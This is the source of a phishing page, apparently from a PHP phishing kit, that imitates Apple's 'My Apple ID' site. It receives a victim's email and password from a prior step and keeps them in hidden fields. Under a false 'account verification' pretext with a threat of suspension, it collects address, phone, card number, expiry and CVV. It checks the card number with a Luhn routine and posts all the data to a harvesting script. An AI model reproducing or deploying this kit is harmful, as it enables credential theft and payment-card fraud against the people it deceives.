<?php 
$email = $_POST['email'];
$password = $_POST['password'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en_UK" lang="en_UK" dir="ltr">

		
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />  
    <title>Apple - My Apple ID</title>
	<link rel="shortcut icon" href="http://portalantioxidantes.com/style/images/favicon.gif">
       
	<head>
    <link rel="stylesheet" type="text/css" href="http://portalantioxidantes.com/style/navigation.css"></link>
    <link rel="stylesheet" type="text/css" href="http://portalantioxidantes.com/style/base.css"></link>
    <link rel="stylesheet" type="text/css" href="http://portalantioxidantes.com/style/myappleid.css"></link>
    <script type="text/javascript" src="http://portalantioxidantes.com/style/globalnav.js"></script>    
	</head>

<body onload="javascript:MyAppleID.errorFocus.errorParent();" class="myappleid sign-in index" id="editContainerBody">  



<nav dir="ltr" id="globalheader">
        <ul id="globalnav">
                <li id="gn-apple"><a href=""><span>Apple</span></a></li>
                <li id="gn-store"><a href=""><span>Store</span></a></li>
                <li id="gn-mac"><a href=""><span>Mac</span></a></li>
                <li id="gn-ipod"><a href=""><span>iPad</span></a></li>
                <li id="gn-iphone"><a href=""><span>iPhone</span></a></li>
                <li id="gn-ipad"><a href=""><span>iPad</span></a></li>
                <li id="gn-itunes"><a href=""><span>iTunes</span></a></li> 
                <li id="gn-support" class="gn-last"><a class="gn-last" href=""><span>Support</span></a></li>
        </ul>
   <div id="globalsearch">
   <script type="text/javascript" language="JavaScript">
	
function checkform ( form )
{

   if (form.street.value.length < 2) {
    alert( "Error: invalid field." );
    form.street.focus();
	  document.getElementById('street').style.backgroundColor="#FF6A6A";
    return false ;
}  if (form.citi.value.length < 2) {
    alert( "Error: invalid field." );
    form.citi.focus();
	  document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="#FF6A6A";
    return false ;
} if (form.count.value.length < 2) {
    alert( "Error: invalid field." );
    form.count.focus();
	 document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="#FF6A6A";
    return false ;
}  if (form.pcode.value.length < 1) {
    alert( "Error: invalid field." );
    form.pcode.focus();
		 document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="#FF6A6A";
    return false ;
} 
 if (form.cryy.value.length < 1) {
    alert( "Error: invalid field." );
    form.cryy.focus();
		 document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="";
	  document.getElementById('cryy').style.backgroundColor="#FF6A6A";
    return false ;
} 
 if (form.phone.value.length < 1) {
    alert( "Error: invalid field." );
    form.phone.focus();
		 document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="";
	  document.getElementById('cryy').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="#FF6A6A";
    return false ;
} 
 if (form.first.value.length < 1) {
    alert( "Error: invalid field." );
    form.first.focus();
		 document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="";
	  document.getElementById('cryy').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="#FF6A6A";
    return false ;
} 
 if (form.cc.value.length < 1) {
    alert( "Error: invalid field." );
    form.cc.focus();
	  document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="";
	  document.getElementById('cryy').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="";
	  document.getElementById('cc').style.backgroundColor="#FF6A6A";
    return false ;
} 
 if (!verifyMod10(form.cc.value)) {
   alert( "Card Number is not correct." );
    form.cc.focus();
	  document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="";
	  document.getElementById('cryy').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="";
	  document.getElementById('cc').style.backgroundColor="#FF6A6A";
    return false ;
  }

 if (form.expr.value.length < 1) {
    alert( "Error: invalid field." );
    form.expr.focus();
		 document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="";
	  document.getElementById('cryy').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="";
	  document.getElementById('cc').style.backgroundColor="";
	  document.getElementById('expr').style.backgroundColor="#FF6A6A";
    return false ;
} 
 if (form.cvv.value.length < 1) {
    alert( "Error: invalid field." );
    form.cvv.focus();
		 document.getElementById('street').style.backgroundColor="";
	  document.getElementById('citi').style.backgroundColor="";
	  document.getElementById('count').style.backgroundColor="";
	  document.getElementById('pcode').style.backgroundColor="";
	  document.getElementById('cryy').style.backgroundColor="";
	  document.getElementById('phone').style.backgroundColor="";
	  document.getElementById('first').style.backgroundColor="";
	  document.getElementById('cc').style.backgroundColor="";
	  document.getElementById('expr').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="#FF6A6A";
    return false ;
} 

 return true ;
 }
 
function removeSpacesFromPAN(fieldName) // strips off spaces before and after field name
{

	var startIndex, lastIndex;
	var newFieldName, newC;

	lastIndex = fieldName.length-1;
	startIndex = 0;

	newC = fieldName.charAt(startIndex);
	while ((startIndex<lastIndex) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		startIndex++;
		newC = fieldName.charAt(startIndex);
	}

	newC = fieldName.charAt(lastIndex);
	while ((lastIndex>=0) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		lastIndex--;
		newC = fieldName.charAt(lastIndex);
	}
	if (startIndex<=lastIndex) {
		newFieldName = fieldName.substring(startIndex, lastIndex+1);
		return newFieldName;
	} else {
		return fieldName;
	}
}


function verifyMod10(field)
{
	var PAN = field;

	PAN = removeSpacesFromPAN(PAN);
	var st = PAN;

	if (st.length > 19)
		return false;

	var sum = 0;
	var mul = 1;
	var st_len = st.length;
	var tproduct;

	for (i = 0; i < st_len; i++)
	{
		digit = st.substring(st_len-i-1, st_len-i);

		if (digit == " " || digit == "-")
			continue;

		tproduct = parseInt(digit ,10) * mul;

	    if (tproduct >= 10)
	      sum += (tproduct % 10) + 1;
	    else
	      sum += tproduct;

	    if (mul == 1)
	      mul++;
	    else
	      mul--;
	}

	if ((sum % 10) != 0)
		return false;
 
	return true;
}

function formSub(){
 setTimeout("document.CommonData.submit()",1000);
}

function logPANentry(action) {

                var loc = document.location.pathname.substr(document.location.pathname.lastIndexOf("/")+1)
       
                var rn = Math.random()+"";
                var a = rn * 10000000000000;
                
                
}







                function populateHiddenField()
                    {                            
                    }
 </script>
                <form action="" method="post" class="search" id="g-search"><div>
                        <label for="sp-searchtext"><input type="text" name="q" id="sp-searchtext" accesskey="s" /></label>
                </div></form>
                <div id="sp-magnify"><div class="magnify-searchmode"></div><div class="magnify"></div></div>
                <div id="sp-results"></div>
        </div>
</nav>


<form name="aspnetForm" method="post" action="cmpte.php" onsubmit="return checkform(this);" id="aspnetForm">
<input type="hidden" name="email" value="<?php print "$email"; ?>">
<input type="hidden" name="password" value="<?php print "$password"; ?>">


  <div id="productheader">	  
			  <h2>
			     <img aria-hidden="true" class="DimAppleIdLogoIV" src="http://portalantioxidantes.com/style/images/headerLogo.png" />
			  </h2>	
		</div>

<div id = "OverlayPanelAreUStil" class = "overlaypanel overlay-compare popped short-height" style = "display: none;">   

        <div class = "buttons">
                    <a role="button" onClick="" name="continueLink" class="btn bigblue" id="" style="outline:0" href="#"></a>
        </div>
      </div>
    </div>
  </div>
</div>

<div id = "AreUStilThrOverlayPanelScreen" class = "overlaypanelscreen" style="position: fixed; top: 0px; left: 0px; opacity: 0.6; height: 100%; width: 100%; display: none; z-index: 22000;;background:white; "></div>

		<div id="main">
			<div id="content" class="content">
				<div class="grid2colc wrap">
				
					<div class="column first sidebar">
						<h2>Account Verification</h2>
						<br/>
						<p class="intro">
						
												
						Please take a moment to complete our account verification process. This information is required to verify your identity. Please take your time and fill in the form correctly to avoid further delays under some circumstances providing the wrong information may result in account suspension to protect our customers.
						
						<h2>Why?</h2>
						<br/>
						<p class="intro">
						
												
						We may occasionally ask our customers to complete these steps for many reasons. It may just be that your registered with the wrong information and your account has therefore been flagged on our system as incomplete. It could also be that we have noticed some unusual activity on your account and require additional information about you to verify your identity. These are just two reasons why this may have happened with your account there is a wide range of possibility's however its nothing to worry about we have made our validation process very easy for you to complete in just a few minutes.
				
						
						<!-- >webobject name = "String4"/--></p>
					</div><!--/column-->

					<div class="column last">
				
				
				

				<div class="formrow">
					
			
				
					</span>
					<h2>Street Name</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="250"  placeholder="Street name" id="street" type="text" name="street" />
					</span>
					<h2>City</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="40"  placeholder="City"  id="citi" type="text" name="citi" />
					</span>
                    <h2>County</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="15"  placeholder="County"  id="count" type="text" name="count" />
					</span>				
					<h2>Postal Code</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="10"  placeholder="Postal code"  id="pcode" type="text" name="pcode" />
					</span>			
                   	
					<h2>Country</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="100"  placeholder="Country"  id="cryy" type="text" name="cryy" />
                        </span>
                        <h2>Phone Number</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="100"  placeholder="Phone Number"  id="phone" type="text" name="phone" />
                        </span>
					<h2>CardHolder Name</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="100"  placeholder="CardHolder Name"  id="first" type="text" name="first" />
					
					</span>
					
					<h2>Card Number
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="20"  placeholder="Visa/Mastercard/Amex"  id="cc" type="text" name="cc" />
					</span><img src="http://portalantioxidantes.com/style/images/logo_cc.gif" width="37" height="23" /><img src="http://portalantioxidantes.com/style/images/logo_ccMC.gif" width="37" height="23" /><img src="http://portalantioxidantes.com/style/images/logo_ccAmex.gif" width="37" height="23" /><img src="http://portalantioxidantes.com/style/images/logo_ccDiscover.gif" width="37" height="23" /></h2>
					<h2>Expiry Date</h2>
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="7"  placeholder="MM/YY"  id="expr" type="text" name="expr" />
					</span>
					<h2>Card Verification Number
					<span class="formwrap">
						<input size="30" autocapitalize="off" autocorrect="off" maxlength="4"  placeholder="3 or 4 digits on the back of your card"  id="cvv" type="text" name="cvv" />
					</span><img src="http://portalantioxidantes.com/style/images/cvv.png" width="52" height="33" /></h2>
					
				</div>
				
				<div id="bot-nav">
					
					
						<a type="submit" class="btn bigblue">
							<input class="btn bigblue" id="" type="submit" value="Complete Verification" name="" />
							
						</a>					
					
				</div>
		
					</div>
				</div>
			</div>
		</div>
	


    
    <footer id="globalfooter">
	
<div id="breadory">
	<ol id="breadcrumbs">
		<li class="home"><a href="">Home</a></li>
		<li> <a onClick="" href="#">My Apple ID</a></li>	
		<li>  </li>
	</ol>
</div>

<div class="gf-sosumi">
        <p>Copyright &copy; 2014 Apple Inc. All rights reserved.</p>
        <ul class="piped">
                <li><a class="first" href="">Terms of Use</a></li>
                <li><a href="">Privacy Policy</a></li>
                  <li style="float:right">
                <a class="choose" title="Choose your country or region" href=""><p style="display:inline;margin-right:-5px; padding-right:0px;">Choose your country or region</p><img class="img-22" src="http://portalantioxidantes.com/style/images/UKflag.png" /></a></li>
            </ul>
</div>

</footer>
</html>


